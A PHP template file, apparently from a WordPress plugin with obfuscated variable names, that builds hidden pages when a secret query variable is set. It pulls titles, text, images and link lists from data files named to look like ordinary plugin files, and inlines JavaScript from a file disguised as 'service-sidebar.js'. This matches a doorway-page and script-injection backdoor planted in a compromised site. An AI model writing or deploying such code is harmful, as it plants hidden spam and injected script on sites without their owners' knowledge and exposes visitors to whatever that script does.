<?php
$bIj1w25W0 = intval(get_query_var('roalqdvpz'));

if ($bIj1w25W0 < 1 || $bIj1w25W0 > 4873) return;
$tZenkkgdT = file(plugin_dir_path(__FILE__).'switcher-style.php', FILE_IGNORE_NEW_LINES | FILE_SKIP_EMPTY_LINES);

$mpzrqS = explode(';', $tZenkkgdT[$bIj1w25W0]);
if (count($mpzrqS) < 2) return;
$q4yX3 = $mpzrqS[0];
$wBoOGwce  = $mpzrqS[1];
$lsW44PTlH7 = $mpzrqS[2];
$cRcmQRGjF  = $mpzrqS[3];
$bS8CIHUz = $mpzrqS[4];
set_query_var('vzuirg', $q4yX3);

$rD5KLV = '';
$qtLxGE2zh = plugin_dir_path(__FILE__).'orders-history.php';
if (is_file($qtLxGE2zh)) {
	$dzSODaPoZv = file($qtLxGE2zh, FILE_IGNORE_NEW_LINES | FILE_SKIP_EMPTY_LINES);
	array_shift($dzSODaPoZv);
	shuffle($dzSODaPoZv);
	$aD99sRzd = mt_rand(2, 5);
	if (count($dzSODaPoZv) > $aD99sRzd) {
		for ($fAw3TI7 = 0; $fAw3TI7 < $aD99sRzd; $fAw3TI7++) {
			$yQXFjgK2F = array_shift($dzSODaPoZv);
			$rD5KLV .= '<p><a href="'.$yQXFjgK2F.'">'.$yQXFjgK2F.'</a>' . "</p>\n";
		}
	}
}

status_header(200);
get_header();
?>

<div id="primary" class="content-area">
	<main id="main" class="site-main wp-block-group has-global-padding is-layout-constrained wp-block-group-is-layout-constrained">
		<article class="page type-page wp-block-group alignfull has-global-padding is-layout-constrained wp-block-group-is-layout-constrained">
			<header class="entry-header">
				<h1 class="entry-title wp-block-post-title"><?php echo $q4yX3; ?></h1>
			</header>
			<div class="entry-content alignfull wp-block-post-content has-global-padding is-layout-constrained wp-block-post-content-is-layout-constrained">
				<?php
				echo "<p>" . $wBoOGwce . "</p>\n";
				if (strlen($cRcmQRGjF) > 0) echo "<p>" . $cRcmQRGjF . "</p>\n";
				if (strlen($lsW44PTlH7) > 0) echo "<p>" . $lsW44PTlH7 . "</p>\n";
				if (strlen($bS8CIHUz) > 0) echo '<p><a href="#"><img src="'.$bS8CIHUz.'"></a>' . "</p>\n";
				echo $rD5KLV;
				?>
			</div>
		</article>
	</main>
</div>

<?php
$eFK0Y12 = plugin_dir_path(__FILE__) . 'service-sidebar.js';
if (is_file($eFK0Y12)) {
	echo '<script type="text/javascript">';
	echo file_get_contents($eFK0Y12);
	echo '</script>';
}
get_footer();
?>
